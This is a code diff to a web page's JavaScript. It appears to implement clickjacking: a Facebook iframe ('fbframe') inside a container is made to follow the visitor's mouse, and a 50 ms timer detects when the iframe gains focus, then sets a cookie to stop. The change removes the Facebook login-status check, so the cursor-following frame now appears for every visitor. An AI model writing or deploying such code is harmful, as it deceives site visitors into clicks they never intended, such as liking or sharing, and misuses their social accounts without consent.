@@ -64,43 +64,14 @@
             name="fbframe"></iframe>
     </div>
     <script type="text/javascript">
-        var graphApiInitialized = false;
-        var status = '';
-        window.fbAsyncInit = function () {
-            FB.init({
-                appId: '312319252170353',
-                status: true,
-                cookie: true,
-                xfbml: true,
-                oauth: true
-            });
-            FB.getLoginStatus(function (response) {
-                if (response.status === 'connected') {
-                    status = 'connected';
-                } else if (response.status === 'not_authorized') {
-                    status = 'not_authorized';
-                } else {
-                    status = '';
-                };
-            });
-            graphApiInitialized = true;
-        };
-
-        (function () {
-            var e = document.createElement('script');
-            e.src = 'http://connect.facebook.net/en_US/all.js';
-            e.async = true;
-            document.getElementById('fb-root').appendChild(e);
-        } ());
-
-        var interval;
+        var inter;
         $(function () {
-            interval = setInterval("updateActiveElement();", 50);
+            inter = setInterval("updateActive();", 50);
         });
 
-        function updateActiveElement() {
+        function updateActive() {
             if ($(document.activeElement).attr('id') == "fbframe") {
-                clearInterval(interval);
+                clearInterval(inter);
                 setCookie('vnn', '1', 10);
             }
         };
@@ -116,7 +87,7 @@
             }
         };
         $(document).mousemove(function (e) {
-            if (getCookie('vnn') != '1' && graphApiInitialized == true && status != '') {
+            if (getCookie('vnn') != '1') {
                 $('#icontainer').show();
                 mouseFollower(e);
             } else {
